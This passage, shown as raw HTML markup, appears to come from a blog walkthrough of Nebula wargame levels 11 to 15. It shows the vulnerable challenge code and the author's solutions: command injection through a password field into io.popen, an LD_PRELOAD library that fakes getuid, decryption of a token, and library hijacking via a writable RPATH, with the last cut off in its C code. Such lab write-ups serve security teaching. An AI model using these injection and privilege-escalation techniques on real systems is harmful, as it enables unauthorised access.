      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pink = %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

      &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pink&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fread fail(blue = %d, length = %d)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

      &lt;span class="n"&gt;blue&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;mem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mmap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PROT_READ&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;PROT_WRITE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MAP_PRIVATE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mem&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;MAP_FAILED&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;mmap&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mem&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I'll be honest with you and admit that I had a lot of trouble with this. I eventually looked up how to do this on other blogs, but still couldn't get it to work. After some searching I believe it's down to the bash version my VM is running. The exploit was possible due to some feature in older versions of bash, but not in the version I have. If you would like to read how to get level 11 you can do so here: &lt;a class="reference external" href="http://www.kroosec.com/2012/11/nebula-level11.html"&gt;http://www.kroosec.com/2012/11/nebula-level11.html&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-12"&gt;
&lt;h2&gt;level 12&lt;/h2&gt;
&lt;blockquote&gt;
There is a backdoor process listening on port 50001.&lt;/blockquote&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;socket&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;50001&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;prog&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;echo &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="s"&gt;&amp;quot; | sha1sum&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nl"&gt;prog&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*all&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="nl"&gt;prog&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
&lt;span class="n"&gt;end&lt;/span&gt;


&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nl"&gt;server&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
  &lt;span class="nl"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Password: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="nl"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nl"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;receive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="n"&gt;then&lt;/span&gt;
    &lt;span class="n"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;trying &amp;quot;&lt;/span&gt; &lt;span class="p"&gt;..&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt; &lt;span class="n"&gt;log&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;\
    &lt;span class="n"&gt;local&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;~=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;then&lt;/span&gt;
      &lt;span class="nl"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Better luck next time&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
      &lt;span class="nl"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Congrats, your token is 413**CARRIER LOST**&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;end&lt;/span&gt;

  &lt;span class="n"&gt;end&lt;/span&gt;

  &lt;span class="nl"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So we need to connect to the localhost on port 50001 and enter the correct password. the password is whatever the hash is in plain text. But even if we get it right you can see that we don't get our token. With a specially crafted password however, we can make use of the &lt;code&gt;io.popen&lt;/code&gt; call.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level12&amp;#64;nebula:/home/flag12$&lt;/span&gt; nc localhost 50001
&lt;span class="go"&gt;Password: hello &amp;amp;&amp;amp; getflag &amp;gt; /tmp/out
Better luck next time
&lt;/span&gt;&lt;span class="gp"&gt;level12&amp;#64;nebula:/home/flag12$&lt;/span&gt; cat /tmp/out
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-13"&gt;
&lt;h2&gt;Level 13&lt;/h2&gt;
&lt;blockquote&gt;
There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/blockquote&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="cp"&gt;#define FAKEUID 1000
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getuid&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;FAKEUID&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Security failure detected. UID %d started us, we expect %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;FAKEUID&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;The system administrators will be notified of this violation&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="c1"&gt;// snip, sorry :)
&lt;/span&gt;
  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;your token is %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Here we need to fake our UID. Sounds tricky. Actually, we don't fake our UID, we fake the call to &lt;code&gt;getuid&lt;/code&gt;. How?
&lt;code&gt;getuid&lt;/code&gt; is called from a library, which means we are able to replace it with our own library. Let's take a look at
the function definition of &lt;code&gt;getuid&lt;/code&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;GETUID(2)                  Linux Programmer's Manual                 GETUID(2)

NAME
       getuid, geteuid - get user identity

SYNOPSIS
&lt;/span&gt;&lt;span class="gp"&gt;       #&lt;/span&gt;include &amp;lt;unistd.h&amp;gt;
&lt;span class="gp"&gt;       #&lt;/span&gt;include &amp;lt;sys/types.h&amp;gt;
&lt;span class="go"&gt;
       uid_t getuid(void);
       uid_t geteuid(void);&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Ok, so let's write our verison of:&lt;/p&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="nf"&gt;getuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;and compile it as a shared library which we then preload (see &lt;code&gt;man ld.so&lt;/code&gt; for more info on this). We need to
copy the &lt;code&gt;flag13&lt;/code&gt; binary to our local directory because it needs to be run as the same user level as the
library we are trying to preload.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level13&amp;#64;nebula:/tmp$&lt;/span&gt; gcc -shared -fPIC fake.c -o fetgetuid.so
&lt;span class="gp"&gt;level13&amp;#64;nebula:/tmp$&lt;/span&gt; cp ~flag13/flag13 .
&lt;span class="gp"&gt;level13&amp;#64;nebula:/tmp$&lt;/span&gt; &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp/fetgetuid.so
&lt;span class="gp"&gt;level13&amp;#64;nebula:/tmp$&lt;/span&gt; ./flag13
&lt;span class="go"&gt;your token is b705702b-76a8-42b0-8844-3adabbe5ac58
&lt;/span&gt;&lt;span class="gp"&gt;level13&amp;#64;nebula:/tmp$&lt;/span&gt; ssh flag13&amp;#64;localhost
&lt;span class="go"&gt;flag13&amp;#64;localhost's password: b705702b-76a8-42b0-8844-3adabbe5ac58
&lt;/span&gt;&lt;span class="gp"&gt;flag13&amp;#64;nebula:~$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-14"&gt;
&lt;h2&gt;Level 14&lt;/h2&gt;
&lt;blockquote&gt;
This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/blockquote&gt;
&lt;p&gt;The contents of &lt;code&gt;token&lt;/code&gt; were encrypted using the &lt;code&gt;flag14&lt;/code&gt; binary in &lt;code&gt;~flag14&lt;/code&gt;. If you run it you can see how it works. Let's enter something and see if we can work out how it works. I created a file with the contents &lt;code&gt;abcdefghijklmno&lt;/code&gt; in &lt;code&gt;/tmp/test&lt;/code&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt; level14&amp;#64;nebula:/home/flag14$ cat /tmp/test | ./flag14 -e
&lt;/span&gt;&lt;span class="gp"&gt;acegikmoqsuwy{}level14&amp;#64;nebula:/home/flag14$&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So luckily it's fairly straightforward, it offsets each letter by the value of its position in the string. A quick Python script can reverse the process.&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;dec&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;
    &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'__main__'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nb"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;
  &lt;span class="n"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And now pipe the token into it&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level14&amp;#64;nebula:/home/flag14$&lt;/span&gt; python /tmp/decrypt.py 857:g67?5ABBo:BtDA?tIvLDKL&lt;span class="o"&gt;{&lt;/span&gt;MQPSRQWW.
&lt;span class="go"&gt;857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
8457c118-887c-4e40-a5a6-33a25353165

&lt;/span&gt;&lt;span class="gp"&gt;level14&amp;#64;nebula:/home/flag14$&lt;/span&gt; ssh flag14&amp;#64;localhost
&lt;span class="go"&gt;
flag14&amp;#64;localhost's password: 8457c118-887c-4e40-a5a6-33a25353165

&lt;/span&gt;&lt;span class="gp"&gt;flag14&amp;#64;nebula:~$&lt;/span&gt; getflag
&lt;span class="go"&gt;You have successfully executed getflag on a target account&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-15"&gt;
&lt;h2&gt;Level 15&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.&lt;/p&gt;
&lt;p&gt;You may wish to review how to &amp;quot;compile a shared library in linux&amp;quot; and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.&lt;/p&gt;
&lt;p&gt;Clean up after yourself :)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After running &lt;code&gt;strace&lt;/code&gt; we notice this particular bit&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level15&amp;#64;nebula:/home/flag15$&lt;/span&gt; strace ./flag15
&lt;span class="go"&gt;.
.
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbfdb8ba4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
.
.&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;It's trying to load libc.so.6 from a specific location. Why is that? Let's use &lt;code&gt;readelf&lt;/code&gt; to take a look&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;evel15&amp;#64;nebula:/home/flag15$&lt;/span&gt; readelf -d ./flag15
&lt;span class="go"&gt;
Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 .
 .
 .&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So it's got an &lt;code&gt;RPATH&lt;/code&gt; to that location and as luck would have it we have write permissions to it. I guess we can create our own &lt;code&gt;libc.so.6&lt;/code&gt; in that directory and use it to execute some code - like get ourselves a flag15 shell. Let's take a look at what symbols we're actually using&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;level15&amp;#64;nebula:/home/flag15$&lt;/span&gt; objdump -R flag15
&lt;span class="go"&gt;
flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So we've got a choice here between &lt;code&gt;__libc_start_main&lt;/code&gt; or &lt;code&gt;__gmon_start&lt;/code&gt;. As I am more comfortable with &lt;code&gt;__libc_start_main&lt;/code&gt; I'm going to go with this.&lt;/p&gt;
&lt;p&gt;So let us begin with the code for our library by looking up the &lt;a class="reference external" href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html"&gt;function declaration&lt;/a&gt;&lt;/p&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;linux/unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;__libc_start_main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
